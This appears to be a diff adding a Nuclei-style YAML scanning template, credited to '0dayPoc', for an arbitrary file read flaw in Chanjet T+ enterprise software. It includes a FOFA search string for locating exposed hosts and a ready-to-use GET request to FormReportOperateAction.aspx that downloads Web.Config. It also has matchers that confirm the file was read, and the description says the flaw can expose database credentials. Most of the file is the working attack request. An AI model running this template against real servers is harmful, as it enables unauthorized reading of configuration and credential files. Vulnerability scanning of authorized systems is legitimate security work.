@@ -1,0 +1,26 @@
+id: chanjie-tong-tplus-formreportoperateaction-aspx-arbitrary-file-read
+
+info:
+  name: "畅捷通T+ FormReportOperateAction.aspx任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="畅捷通-TPlus"
+    畅捷通T+是用友畅捷通公司推出的一款面向中小企业的企业管理软件。其/tplus/FormReport/FormReportOperateAction.aspx接口存在文件读取漏洞。攻击者可通过preload、__Action、filepath参数读取服务器上的任意文件，包括配置文件、源代码等敏感信息，可能导致数据库凭证泄露、服务器权限被完全控制。
+  tags: 畅捷通-TPlus
+
+http:
+- raw:
+  - |
+    GET /tplus/FormReport/FormReportOperateAction.aspx?preload=1&__Action=DownLoadFile&filepath=/Web.Config HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - "xml version"
+      - "<configuration>"
+    condition: and
